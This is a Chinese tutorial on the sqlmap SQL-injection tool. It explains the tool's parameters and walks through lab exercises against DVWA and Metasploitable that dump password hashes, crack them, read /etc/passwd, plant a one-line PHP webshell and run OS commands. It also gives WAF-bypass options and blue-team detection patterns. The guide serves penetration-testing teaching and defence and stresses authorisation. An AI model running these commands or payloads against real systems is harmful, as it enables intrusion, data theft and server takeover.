# sqlmap（自动化 SQL 注入检测与利用）

> **一句话**：自动发现并利用 Web 应用的 SQL 注入点，从指纹识别一路做到拖库、读文件、甚至拿系统 shell。
> **分类**：Web 应用 ｜ **Kali 包**：`sqlmap` ｜ **官方文档**：<https://sqlmap.org/>

## 1. 它解决什么问题

手工测 SQL 注入要反复试 payload、看报错、判断布尔盲注的真假、算时间盲注的延迟……极其繁琐。sqlmap 把这整套流程自动化了：

```text
检测注入点 → 识别 DBMS 类型与版本 → 枚举数据库/表/列 → 拖取数据
                                    ↘ 读文件 / 写文件 / 执行系统命令
```

它的能力阶梯大致是：

| 层级 | 能做什么 | 典型参数 |
|------|---------|---------|
| 1. 检测 | 判断哪些参数可注入、是哪种注入类型 | 默认行为 |
| 2. 指纹 | DBMS 类型、版本、当前用户、是否 DBA | `-b`、`--current-user`、`--is-dba` |
| 3. 枚举 | 库、表、列、用户、权限 | `--dbs`、`--tables`、`--columns` |
| 4. 取数 | 导出数据、导出全部、搜索特定字段 | `--dump`、`--dump-all`、`--search` |
| 5. 攻陷 | 读/写文件、OS 命令、SQL shell、提权 | `--file-read`、`--file-write`、`--os-shell`、`--priv-esc` |

| 工具 | 定位 |
|------|------|
| **sqlmap** | SQL 注入的**一站式自动化**（检测 + 利用 + 取数） |
| [commix](commix.md) | 命令注入的对应工具 |
| [wfuzz](wfuzz.md) / [ffuf](ffuf.md) | 参数 fuzz，能**发现**疑似注入点但不做利用 |
| Burp Suite + SQLiPy | 手工/半自动，配合代理 |
| [nuclei](../02-漏洞分析/nuclei.md) | 用模板做"有没有"的快速判断 |

**分工建议**：用 [ffuf](ffuf.md)/[wfuzz](wfuzz.md) 快速筛出可疑参数 → 用 [nuclei](../02-漏洞分析/nuclei.md) 模板做初步确认 → 用 sqlmap 做**完整验证与数据提取**。sqlmap 是最后一个环节，因为它噪声最大、耗时最长。

## 2. 工作原理

sqlmap 对每个参数尝试多种注入技术，用**响应差异**判断是否可注入：

```text
   sqlmap -u "http://target/page.php?id=1"
        │
   ┌────┴─────────────────────────────────────────────────────────────┐
   │ ① 建立基线：先发正常请求，记录响应特征                             │
   │    （页面长度、内容、状态码、响应时间）                            │
   └────┬─────────────────────────────────────────────────────────────┘
        │
   ┌────┴─────────────────────────────────────────────────────────────┐
   │ ② 逐技术试探（--technique 控制，默认全部 BEUSTQ）                  │
   │                                                                   │
   │  B  Boolean-based blind（布尔盲注）                                │
   │     注入 AND 1=1 / AND 1=2，比较页面差异 → 推断真/假               │
   │                                                                   │
   │  E  Error-based（报错注入）                                        │
   │     注入会触发 DBMS 报错的 payload，直接从错误消息里读数据          │
   │     最快最准，命中即"完美"注入                                     │
   │                                                                   │
   │  U  Union query-based（联合查询注入）                              │
   │     用 UNION SELECT 把数据拼到正常查询结果里返回                    │
   │     需要判断列数（--union-cols）和回显位置                          │
   │                                                                   │
   │  S  Stacked queries（堆叠查询）                                    │
   │     用分号执行多条语句；不是所有 DBMS/驱动都支持                    │
   │                                                                   │
   │  T  Time-based blind（时间盲注）                                   │
   │     注入 SLEEP(5)，比较响应时间；页面无差异时的最后手段              │
   │     最慢，但几乎"处处可用"                                         │
   │                                                                   │
   │  Q  Inline queries（内联查询）                                     │
   │     在原有查询里插入子查询                                          │
   └────┬─────────────────────────────────────────────────────────────┘
        │
   ┌────┴─────────────────────────────────────────────────────────────┐
   │ ③ 确认 DBMS 与注入类型后，开始"抽取"                               │
   │    抽取是**逐字符**进行的（布尔/时间盲注下）：                      │
   │      对每个字符做二分查找，每猜一位发一个请求                        │
   │    → 所以盲注拖库会非常慢，`--threads` 和 `--technique` 很关键       │
   │    会话信息（已发现的注入点、已抽的数据）缓存在                     │
   │      ~/.local/share/sqlmap/output/<host>/  里，可复用              │
   └────┬─────────────────────────────────────────────────────────────┘
        │
   输出：终端 + 结果文件（默认在 output 目录下）
```

几个关键机制：

- **`--level`（1-5）控制"测试多少参数、用多少 payload"**。默认 1 只测 GET/POST 里最明显的参数；提到 3 会测 `User-Agent`、`Referer`；5 会测 `Host`、`Cookie` 等所有能想到的位置。
- **`--risk`（1-3）控制"测试的危害程度"**。默认 1 最温和；2 会加入基于时间/事件的 payload；**3 会加入 `OR` 型的 payload，可能造成 UPDATE/DELETE 等副作用**——生产环境绝不要用 3。
- **`--technique` 是提速的关键**。知道目标有报错回显时，直接 `--technique E` 会快得多。
- **会话缓存**：sqlmap 把已发现的注入点写进输出目录，下次运行时直接复用。所以 `--flush-session` 用于"从头再来"，`--fresh-queries` 用于"重新取数但保留结构信息"。
- **`--tamper` 脚本**用于绕过 WAF/过滤（如把 `SELECT` 变成 `SeLeCt`、把空格换成 `/**/`）；`--list-tampers` 可以列出全部。

## 3. 安装与快速上手

```bash
sudo apt install sqlmap
sqlmap --version
sqlmap -h | head -40
sqlmap -hh | less     # 完整帮助（很长，但参数都在这里）
```

最小可用命令：

```bash
# 1) 最基础的检测
sqlmap -u "http://192.168.56.102:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=xxxx" --batch

# 2) 检测并列出所有数据库
sqlmap -u "http://target/vuln.php?id=1" --dbs --batch

# 3) 针对 POST 请求
sqlmap -u "http://target/login.php" --data="username=admin&password=admin" --batch
```

> ⚠️ **只在你有明确授权的目标上使用 sqlmap。** 它会对目标数据库发起大量查询，`--risk 3` 甚至可能修改数据。对生产系统必须事先取得书面授权。

## 4. 核心参数详解

### 目标定义（至少给一个）

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-u, --url=URL` | 直接指定 URL | 最常用 |
| `-d` | 直连数据库（如 `mysql://user:pass@host:port/db`） | 已有凭据时跳过 Web 层 |
| `-l` | 从 Burp/WebScarab 的代理日志文件解析请求 | **实战中非常好用** |
| `-m` | 从文件读多个目标 | 批量 |
| `-r` | 从文件读原始 HTTP 请求 | 复杂请求（自定义头/Cookie）的最佳方式 |
| `-g` | 用 Google dork 结果作为目标 | 仅用于授权范围 |
| `-c` | 读配置文件 | 固化常用参数 |
| `--openapi` / `--openapi-base` / `--openapi-tags` | 从 OpenAPI/Swagger 定义导入目标 | API 测试 |

### 请求构造

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `--data=DATA` | POST 数据（如 `id=1&name=x`） | 测 POST 参数 |
| `--param-del=<c>` | 自定义参数分隔符（默认 `&`） | 特殊格式 |
| `--cookie=COOKIE` | Cookie 值 | 需要登录态时必加 |
| `--cookie-del` / `--live-cookies` / `--load-cookies` | Cookie 分隔符 / 动态 Cookie / 从文件加载 | 复杂会话 |
| `-A, --user-agent` | 指定 User-Agent | — |
| `--random-agent` | 随机 UA | 绕过基于 UA 的简单过滤 |
| `-H, --header=<h>` | 额外请求头（可多次） | 加 token、`X-Forwarded-For` 等 |
| `--headers=<h>` | 用 `\n` 分隔的多个头 | — |
| `-X, --method=<m>` | 强制 HTTP 方法 | 如 `PUT` |
| `--referer` / `--host` | 指定 Referer / Host | **Host 头注入** |
| `--http2` / `--mobile` | 用 HTTP/2 / 模拟移动端 UA | — |
| `--auth-type` / `--auth-cred` / `--auth-file` | HTTP 认证（Basic/Digest/NTLM） | — |
| `--proxy=PROXY` | 走代理（如 `http://127.0.0.1:8080`） | **配合 Burp 观察/改包** |
| `--proxy-cred` / `--proxy-file` / `--proxy-freq` | 代理凭据 / 代理列表轮换 / 换代理频率 | 隐匿与限速 |
| `--tor` / `--tor-port` / `--tor-type` / `--check-tor` | 走 Tor | **注意：Tor 出口 IP 常被 WAF 直接封** |
| `--delay=<s>` | 每个 HTTP 请求之间延迟秒数 | **生产环境必设**（如 `--delay 1`） |
| `--timeout=<s>` | 请求超时（默认 30） | — |
| `--retries=<n>` | 超时重试次数（默认 3） | — |
| `--randomize=<p>` | 每次请求随机化指定参数的值 | 规避缓存/检测 |
| `--safe-url` / `--safe-post` / `--safe-req` / `--safe-freq` | 定期访问"安全 URL"以避免会话失效 | **长时间盲注拖库时的救命参数** |
| `--csrf-token` / `--csrf-url` / `--csrf-method` / `--csrf-data` / `--csrf-retries` | CSRF token 自动获取与携带 | 有 CSRF 防护的站点 |
| `--skip-urlencode` | 不 URL 编码 payload | 目标有特殊解码逻辑时 |
| `--force-ssl` | 强制使用 HTTPS | — |
| `--chunked` | 使用 chunked 传输编码 | 绕过 WAF 长度检查 |
| `--hpp` | 使用 HTTP 参数污染 | 绕过某些 WAF |
| `--eval=<code>` | 每次请求前执行一段 Python 代码 | 动态计算参数（如签名） |
| `--ignore-proxy` / `--ignore-redirects` / `--ignore-timeouts` / `--ignore-code` / `--abort-code` | 忽略系统代理/重定向/超时/指定状态码/遇错中止 | 精细控制 |
| `-o` | 开启所有优化开关 | 提速 |

### 注入测试控制

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-p <param>` | 只测指定参数 | **提速最有效的手段** |
| `--skip=<param>` | 跳过指定参数 | 排除易触发告警的参数 |
| `--skip-static` | 跳过看起来是静态的参数 | 减少无用测试 |
| `--param-exclude=<re>` | 用正则排除参数 | 如排除 `csrf.*` |
| `--param-filter=` | 按位置过滤参数（GET/POST/...） | — |
| `--dbms=<name>` | 强制指定后端 DBMS | **已知类型时大幅提速** |
| `--os=<name>` | 强制指定后端操作系统 | — |
| `--invalid-bignum` / `--invalid-logical` / `--invalid-string` | 改变"无效值"的构造方式 | 绕过过滤 |
| `--no-cast` / `--no-escape` | 关闭类型转换 / 关闭字符串转义 | 特定 DBMS 场景 |
| `--prefix=<s>` / `--suffix=<s>` | 给 payload 加前后缀 | 闭合引号/括号的复杂场景 |
| `--tamper=<script>` | 使用篡改脚本绕过过滤（可多个，逗号分隔） | `--list-tampers` 查看全部 |
| `--level=<1-5>` | 测试深度（默认 1） | 提到 3 会测 UA/Referer |
| `--risk=<1-3>` | 测试风险（默认 1） | **生产环境不要用 3** |
| `--string=<s>` / `--not-string=<s>` | 用指定字符串判断真/假 | 手动定义布尔盲注判据 |
| `--regexp=<re>` / `--code=<n>` / `--lengths=<l>` | 用正则/状态码/长度判断 | — |
| `--smart` | 只在有启发式证据时才做更深入测试 | 提速 |
| `--text-only` / `--titles` | 只用文本内容 / 只用标题比较 | 减少噪声 |
| `--technique=<B\|E\|U\|S\|T\|Q>` | 只用指定技术 | **提速关键**，如 `--technique=E` |
| `--time-sec=<s>` | 时间盲注的延迟秒数（默认 5） | 网络慢时调大 |
| `--union-cols=<n>` / `--union-char` / `--union-from` / `--union-values` | UNION 注入的手工辅助 | 提高 union 成功率 |
| `--dns-domain=<d>` | 用 DNS 外带（需自建 DNS） | OOB 注入提速/绕过 |
| `--second-url` / `--second-req` | 二阶注入的第二个 URL/请求 | 存储型注入 |
| `-f, --fingerprint` | 只做 DBMS 指纹识别 | 信息收集阶段 |

### 枚举与取数

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-a, --all` | 取回全部信息 | 一次到位但很慢 |
| `-b, --banner` | DBMS banner | 第一步 |
| `--current-user` / `--current-db` / `--hostname` | 当前用户 / 当前库 / 主机名 | — |
| `--is-dba` | 是否为 DBA（管理员） | **决定后续能不能读写文件/执行命令** |
| `--users` / `--passwords` | 用户列表 / 口令哈希 | 拿到哈希后可离线破解 |
| `--privileges` / `--roles` | 权限 / 角色 | — |
| `--dbs` | 所有数据库 | — |
| `--tables`（配 `-D`） | 指定库的表 | — |
| `--columns`（配 `-D -T`） | 指定表的列 | — |
| `--schema` / `--count` | 表结构 / 行数 | — |
| `--dump`（配 `-D -T`） | 导出数据 | 最常用 |
| `--dump-all` | 导出所有库所有表 | **极慢且噪声极大** |
| `--search`（配 `-C`/`-T`/`-D`） | 在所有库里搜索表/列名 | **找"用户表""密码列"最快的方式** |
| `-D <db>` / `-T <table>` / `-C <cols>` | 指定库/表/列 | 与上面配合 |
| `--exclude-sysdbs` | 排除系统库 | 减少噪声 |
| `--where=<sql>` | 导出时加 WHERE 条件 | 如 `--where="id=1"` |
| `--start` / `--stop` / `--first` / `--last` | 限制导出的字符范围/行范围 | 只取需要的部分 |
| `--exclude=<cols>` | 排除某些列 | — |

### 系统层利用

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `--sql-query=<sql>` / `--sql-shell` / `--sql-file` | 执行任意 SQL / 交互式 SQL shell / 从文件执行 | 已确认 DBA 权限后 |
| `--file-read=<path>` | 读取服务器文件 | 需要 FILE 权限/DBA |
| `--file-write` + `--file-dest` | 写文件到服务器 | 常配合写 WebShell |
| `--os-cmd=<cmd>` / `--os-shell` | 执行系统命令 / 交互式 shell | 取决于 DBMS 与权限 |
| `--os-pwn` / `--os-smbrelay` / `--os-bof` | 用 Metasploit/Meterpreter 接管 | 需要 `--msf-path` |
| `--priv-esc` | 尝试提权 | — |
| `--reg-read` / `--reg-add` / `--reg-del` / `--reg-key` / `--reg-value` / `--reg-data` / `--reg-type` | Windows 注册表操作 | — |
| `--common-tables` / `--common-columns` / `--common-files` | 用常见名称字典猜测表/列/文件 | 拿不到元数据时的兜底 |
| `--udf-inject` / `--shared-lib` | UDF 提权 | 高级 |
| `--pivot-column` | 指定用于横向列的列 | 表间关联导出 |

### 其他数据模型（超越传统 SQL）

| 参数 | 作用 |
|------|------|
| `--graphql` / `--ldap` / `--nosql` / `--xpath` / `--ssti` / `--xslt` / `--xxe` / `--hql` / `--sparql` / `--odata` / `--jwt` | 针对 GraphQL / LDAP / NoSQL / XPath / SSTI / XSLT / XXE / HQL / SPARQL / OData / JWT 的检测 |

### 输出与运行控制

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-v <0-6>` | 详细级别（默认 1） | `-v 3` 能看到发的 payload |
| `--batch` | **所有交互提问都用默认答案** | **脚本化必加** |
| `--answers=<s>` | 预设交互答案 | 精细的非交互控制 |
| `--flush-session` | 清空该目标的会话缓存 | 换参数后从头再来 |
| `--fresh-queries` | 不复用缓存的查询结果 | 数据已变时 |
| `--parse-errors` | 解析响应里的 DBMS 错误消息 | 调试 |
| `--output-dir=<d>` | 自定义输出目录 | 项目隔离 |
| `--dump-file` / `--dump-format=<CSV\|HTML\|SQLITE>` | 导出文件名 / 格式 | — |
| `--csv-del` / `--charset` / `--encoding` | CSV 分隔符 / 字符集 / 编码 | 中文乱码时改编码 |
| `--hex` | 用十六进制取数据 | 二进制/编码问题 |
| `--binary-fields` | 指定哪些字段按二进制处理 | — |
| `--crawl=<n>` / `--crawl-exclude` / `--forms` / `--scope` | 爬取站点深度 / 排除路径 / 自动解析表单 / 范围限定 | **自动找注入点** |
| `--crack` | 用常见口令字典破解拿到的哈希 | — |
| `--tamper` 之外还有 `--test-filter` / `--test-skip` | 按关键字筛选/跳过测试 | 提速 |
| `--time-limit` / `--eta` | 总时长限制 / 显示进度估计 | — |
| `--threads=<n>` | 并发线程数（默认 1） | **盲注提速的关键**，但会显著增加目标负载 |
| `--no-keep-alive` / `--null-connection` | 关闭 keep-alive / 用"空连接"判断 | 特定场景 |
| `--alert=<cmd>` | 有发现时执行 shell 命令 | 自动化告警 |
| `--beep` | 有发现时响铃 | 长任务 |
| `--cleanup` | 清理 sqlmap 在目标上留下的痕迹（如临时 UDF/表） | **演练结束前应执行** |
| `--wizard` | 向导模式，交互式提问题 | 新手 |
| `--update` | 更新 sqlmap 自身 | — |
| `--list-tampers` | 列出所有 tamper 脚本 | — |
| `-s <file>` | 把会话数据存到指定 SQLite 文件 | — |
| `-t <file>` | 把所有 HTTP 流量记录到文件 | 复盘 |
| `-z <opts>` | 简写形式批量传参 | 如 `-z "batch,random-agent"` |

## 5. 实战演练

**环境**：以下全部使用本地合法靶场。

- **DVWA**（Damn Vulnerable Web Application）：`docker run -d -p 8080:80 vulnerables/web-dvwa` → `http://192.168.56.102:8080`
- **Metasploitable2** 内置的 DVWA 与 Mutillidae → `http://192.168.56.101`
- **Juice Shop**（Modern 靶场）：`docker run -d -p 3000:3000 bkimminich/juice-shop`
- 攻击机：Kali `192.168.56.10`

> sqlmap 会对目标数据库发大量查询，**只对授权目标使用**。`--risk 3` 可能修改数据，生产环境禁用。

### 场景 1：DVWA 低安全级别——从检测到拿数据

**前置准备**：浏览器登录 DVWA，把安全级别设为 `low`，进入 SQL Injection 页面，从 URL 里拿到 Cookie：

```text
http://192.168.56.102:8080/vulnerabilities/sqli/?id=1&Submit=Submit
Cookie: PHPSESSID=abc123...; security=low
```

**第一步：检测注入点**

```bash
sqlmap -u "http://192.168.56.102:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --batch -p id -v 3
```

预期输出片段：

```text
[*] starting @ 17:52:31 /2026-09-15/

[17:52:31] [INFO] testing connection to the target URL
[17:52:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:52:32] [INFO] testing if the target URL content is stable
[17:52:32] [INFO] target URL content is stable
[17:52:32] [INFO] testing if GET parameter 'id' is dynamic
[17:52:32] [INFO] GET parameter 'id' appears to be dynamic
[17:52:32] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[17:52:33] [INFO] testing for SQL injection on GET parameter 'id'
[17:52:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:52:33] [PAYLOAD] 1 AND 1248=1248 AND 'bVAl'='bVAl'
[17:52:34] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[17:52:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:52:35] [PAYLOAD] 1 AND (SELECT 5943 FROM (SELECT(SLEEP(0)))ihBO)
[17:52:36] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable

Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1248=1248 AND 'bVAl'='bVAl'&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 5943 FROM (SELECT(COUNT(*),CONCAT(...)))x)&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4694 FROM (SELECT(SLEEP(5)))xyz)&Submit=Submit

    Type: UNION query
    Title: MySQL >= 5.0 UNION query
    Payload: id=1 UNION ALL SELECT CONCAT(...),NULL-- -

[17:52:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
```

解读：**`-p id` 只测 id 参数**（省掉大量无用测试），`-v 3` 让你看到实际发出的 `[PAYLOAD]`——这在调试和报告取证时非常有用。注意 sqlmap 同时识别出 4 种注入类型，**报错型（error-based）通常是最好用的**，因为取数最快。

**第二步：指纹与权限**

```bash
sqlmap -u "http://192.168.56.102:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" \
       --batch -p id -b --current-user --current-db --is-dba
```

预期输出：

```text
banner: '5.7.42-log'
current user: 'root@localhost'
current database: 'dvwa'
current user is DBA: True
```

解读：`current user is DBA: True` 是关键——**意味着后续可以读文件、写文件、甚至执行命令**。

**第三步：枚举并导出数据**

```bash
# 列出所有库
sqlmap -u "..." --cookie="..." --batch -p id --dbs --exclude-sysdbs

# 列出 dvwa 库的表
sqlmap -u "..." --cookie="..." --batch -p id -D dvwa --tables

# 列出 users 表的列
sqlmap -u "..." --cookie="..." --batch -p id -D dvwa -T users --columns

# 导出 users 表
sqlmap -u "..." --cookie="..." --batch -p id -D dvwa -T users --dump
```

预期输出片段：

```text
Database: dvwa
Table: users
[5 entries]
+---------+----------+----------------------------------+
| user_id | user     | password                         |
+---------+----------+----------------------------------+
| 1       | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | gordonb  | e99a18c428cb38d5f260853678922e03 |
...
```

解读：`5f4dcc3b5aa765d61d8327deb882cf99` 是 MD5，`--dump` 的输出后面 sqlmap 通常会提示：

```text
[17:58:12] [INFO] retrieved: 'admin'
[17:58:12] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
do you want to crack them via a dictionary-based attack? [Y/n/q]
```

配合 `--batch` 时会自动选择默认（不破解）。**主动破解用 `--crack` 或在提示处回答 `Y`**，会调用内置字典与 hashcat。

### 场景 2：POST 请求 + 用 `-r` 读原始请求（最灵活的用法）

实战中最稳的方式是**从 Burp 导出请求**，用 `-r` 直接读：

```bash
# 从 Burp 复制原始请求保存为 req.txt（包含 Cookie、自定义头等）
sqlmap -r req.txt -p username --batch --dbs
```

`req.txt` 内容示例：

```http
POST /login.php HTTP/1.1
Host: 192.168.56.101
Cookie: PHPSESSID=abc123; security=low
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=admin
```

**不带 Burp 时手写 POST 参数**：

```bash
sqlmap -u "http://192.168.56.101/dvwa/login.php" \
       --data="username=admin&password=admin&Login=Login" \
       --cookie="PHPSESSID=abc123; security=low" \
       -p username --batch --level 2 --risk 1
```

解读：`-r` 的好处是**不用手工复制 Cookie 和头**——Burp 里右键"Copy to file"即可。这是渗透测试中的标准工作流。

### 场景 3：绕过防护（tamper + 延迟 + 安全 URL）

```bash
# 1) 查看可用的 tamper 脚本
sqlmap --list-tampers | head -30

# 2) 组合多个 tamper 绕过 WAF
sqlmap -u "http://target/page.php?id=1" --batch \
  --tamper="space2comment,between,randomcase" \
  --random-agent --delay 1 --retries 2

# 3) 长时间盲注：定期访问安全页面避免会话过期
sqlmap -u "http://target/page.php?id=1" --batch \
  --technique=T --time-sec 3 --threads 4 \
  --cookie="PHPSESSID=xxx" \
  --safe-url="http://target/index.php" --safe-freq=20 \
  --delay 0.5
```

解读：
- `--tamper` 只解决**基于关键字/空格的简单过滤**。现代 WAF 需要更多手段（`--chunked`、`--hpp`、`--eval` 动态签名等）。
- `--safe-url` + `--safe-freq` 是**盲注拖库必备**——否则跑一半会话过期、前功尽弃。
- `--delay 1` 是生产环境的基本礼仪，避免把目标打垮。

### 场景 4（进阶）：文件读写与 OS shell

```bash
# 前提：--is-dba 为 True

# 1) 读服务器文件
sqlmap -u "..." --batch -p id --file-read="/etc/passwd"
cat ~/.local/share/sqlmap/output/192.168.56.102/files/_etc_passwd

# 2) 写文件（例如写一个 WebShell 到 Web 目录）
echo '<?php system($_GET["c"]); ?>' > shell.php
sqlmap -u "..." --batch -p id \
  --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 3) 执行系统命令
sqlmap -u "..." --batch -p id --os-cmd="id"

# 4) 交互式 SQL shell
sqlmap -u "..." --batch -p id --sql-shell
#   sql-shell> SELECT user,password FROM users;

# 5) 清理痕迹（演练结束前务必执行）
sqlmap -u "..." --batch -p id --cleanup
```

解读：
- 文件读写依赖 DBMS 的 `FILE` 权限与 `secure_file_priv` 配置。MySQL 8 默认 `secure_file_priv` 受限，可能失败。
- `--os-cmd` 是否能成功取决于 DBMS（MySQL 需要写 UDF；MSSQL 有 `xp_cmdshell`；PostgreSQL 有 `COPY ... TO PROGRAM`）。
- **`--cleanup` 会删除 sqlmap 创建的临时表/UDF**。在正式演练中**结束时应该执行**，避免污染目标环境。

### 场景 5：自动化——爬站找点 + 批量结果

```bash
# 让 sqlmap 自己爬站点、解析表单、找注入点
sqlmap -u "http://192.168.56.101/mutillidae/" --batch \
  --crawl=3 --forms --scope="http://192.168.56.101/mutillidae/" \
  --cookie="PHPSESSID=abc123" \
  --level 2 --risk 1 --threads 4 \
  --output-dir=/lab/sqlmap_results

# 批量目标（每行一个 URL）
cat targets.txt
sqlmap -m targets.txt --batch --level 1 --risk 1 \
  --output-dir=/lab/sqlmap_batch --results-file=/lab/sqlmap_batch/summary.csv
```

解读：`--crawl` 会遍历站点内的链接和表单，自动构造测试目标。`--scope` 防止它爬到授权范围外。`--results-file` 输出汇总 CSV，适合批量作业。

## 6. 输出解读

### 检测阶段的日志关键词

| 日志 | 含义 | 下一步 |
|------|------|--------|
| `testing connection to the target URL` | 连通性检查 | 失败时检查 URL/Cookie/代理 |
| `target URL content is stable` | 页面稳定，适合做差异比较 | 不稳定时用 `--string`/`--code` 手工定义判据 |
| `parameter 'X' appears to be dynamic` | 参数会影响响应 | 值得继续测 |
| `parameter 'X' might be injectable` | 启发式判断可能有注入 | 继续测试 |
| `[PAYLOAD] ...` | `-v 3` 下打印的实际 payload | 报告/调试取证 |
| `parameter 'X' is 'TECHNIQUE' injectable` | **确认可注入，并给出技术类型** | **这是核心结论** |
| `all tested parameters do not appear to be injectable` | 没发现注入 | 提高 `--level`/`--risk`；换技术；检查 Cookie |

### 注入技术（Type）速查

| Type | 特点 | 速度 | 可靠性 |
|------|------|------|--------|
| `error-based` | 直接从报错读数据 | **最快** | 高 |
| `UNION query` | 数据拼进正常响应 | **最快** | 高（但需要回显位置） |
| `boolean-based blind` | 靠页面差异逐位推断 | 慢 | 高 |
| `time-based blind` | 靠延迟逐位推断 | **最慢** | 中（网络抖动会影响） |
| `stacked queries` | 执行多条语句 | 取决于场景 | 中（需要驱动支持） |
| `inline query` | 子查询插入 | 快 | 中 |

**优化顺序**：如果 sqlmap 报出 `error-based` 或 `UNION`，一定优先用它（`--technique=EU`）——盲注拖一个大表可能要几小时。

### 输出的数据文件

默认输出目录：`~/.local/share/sqlmap/output/<target>/`

| 文件/目录 | 内容 |
|----------|------|
| `log` | 完整运行日志 |
| `session.sqlite` | 会话缓存（注入点、已抽数据） |
| `dump/<db>/<table>.csv` | 导出的数据（CSV） |
| `files/` | `--file-read` 读回来的文件 |

## 7. 与其他工具配合

```bash
# 1) Burp 抓包 -> sqlmap（最标准的实战流程）
#    Burp 里右键请求 → Copy to file → req.txt
sqlmap -r req.txt --batch --level 2 --risk 1 --dbs

# 2) ffuf/wfuzz 筛出可疑参数 -> sqlmap 精确验证
ffuf -u "http://target/page.php?id=FUZZ" -w ids.txt -fs 0 -o ffuf.json -of json
jq -r '.results[].input.FUZZ' ffuf.json | while read -r v; do
  sqlmap -u "http://target/page.php?id=$v" --batch -p id --smart --technique=BEU --dbs
done

# 3) nuclei 确认存在 SQLi -> sqlmap 深入利用
nuclei -u "http://target/page.php?id=1" -tags sqli -silent
sqlmap -u "http://target/page.php?id=1" --batch --level 3 --risk 2 --dbs

# 4) sqlmap 拿到哈希 -> 离线破解
sqlmap -u "..." --batch -p id -D dvwa -T users --dump --crack
# 或手工：
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) SQLMap API（给自动化平台调用）
sqlmapapi -s          # 启动 API 服务
# 然后用 HTTP 接口提交任务、查询状态

# 6) 通过 Burp 代理观察 sqlmap 的每个请求
sqlmap -u "http://target/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch
```

## 8. 常见坑与排错

| 现象 | 原因 | 解决 |
|------|------|------|
| `all tested parameters do not appear to be injectable` | 参数确实安全 / level 太低 / 需要认证 | 提高 `--level 3`；加 `--cookie`；确认登录态有效；试 `--risk 2`（非生产） |
| 明明有注入但 sqlmap 找不到 | 参数名不在 URL 里 / 需要特殊编码 | 用 `--data` 指定 POST；`--skip-urlencode`；`--tamper` |
| 检测很慢 | 默认测所有技术、所有位置 | `-p <指定参数>`、`--technique=E`、`--dbms=mysql`、`--smart` |
| 盲注拖库慢得不可接受 | 逐字符二分推断的特性 | `--threads 4`；优先 `--technique=EU`；用 `--where` 只取需要的行 |
| 跑到一半会话失效 | Cookie 过期 | `--safe-url` + `--safe-freq`；或加大 `--cookie` 有效期 |
| WAF 拦截，全部返回 403 | 被识别为扫描流量 | `--random-agent`、`--delay 2`、`--tamper`、`--chunked`、`--hpp`；必要时换源 IP |
| `--tor` 后连不上 | Tor 出口 IP 常被直接封 | 不要用 `--tor` 打生产目标；用 SOCKS 代理链 |
| 中文数据乱码 | 编码不匹配 | `--encoding=GBK`（或对应编码）；`--hex` |
| MySQL 写文件失败 | `secure_file_priv` 限制 / 无 FILE 权限 | 检查 `--is-dba`；尝试其他路径（`/tmp`）；改走 `--os-shell` |
| `--os-cmd` 失败 | DBMS 不支持或权限不足 | 换 `--os-pwn`（需 Metasploit）；或只做数据提取 |
| 导出把目标拖垮 | `--dump-all` + `--threads` 太高 | **`--threads 1` + `--delay 1`**；用 `--where` 限制范围 |
| 忘了清理，目标上有残留表 | `--os-shell`/UDF 会创建临时对象 | 结束时执行 `--cleanup` |
| 换了一组参数但结果一样 | 命中了会话缓存 | `--flush-session` |
| 想看 sqlmap 到底发了什么 | 默认 `-v 1` 太简略 | `-v 3`；或 `-t traffic.log` 记录全部流量 |

## 9. 防御视角（蓝队）

sqlmap 是**噪声最大**的 Web 攻击工具之一。这对蓝队是好消息——**它有非常明确的检测特征**。

### 检测特征（高置信度）

| 特征 | 说明 |
|------|------|
| **UA 默认值** | `sqlmap/1.x#stable (https://sqlmap.org)`，不改 UA 时直接可匹配 |
| **典型 payload 关键字** | `AND 1=1`、`AND 1=2`、`SLEEP(5)`、`BENCHMARK(`、`UNION ALL SELECT`、`CONCAT(`、`information_schema`、`LOAD_FILE(`、`INTO OUTFILE` |
| **大量带 SQL 语法的 4xx/5xx** | 注入尝试常触发 DBMS 报错页面 |
| **同一参数高频重复** | 布尔盲注会对**同一参数**发成百上千次请求（每次只改一个字符判断） |
| **延迟特征** | 时间盲注会呈现"固定 5 秒/请求"的规律（`--time-sec` 默认 5） |
| **参数顺序/编码异常** | 双重编码、`/**/` 代替空格（tamper 脚本产物） |
| **扫描节奏** | 请求速率恒定、无静态资源加载、无 Referer |

### 检测规则建议

```text
# 伪 Suricata/ModSecurity 规则思路
- 请求 URI/body 匹配 (?i)(union\s+(all\s+)?select|sleep\s*\(|benchmark\s*\(|information_schema|into\s+outfile|load_file\s*\()
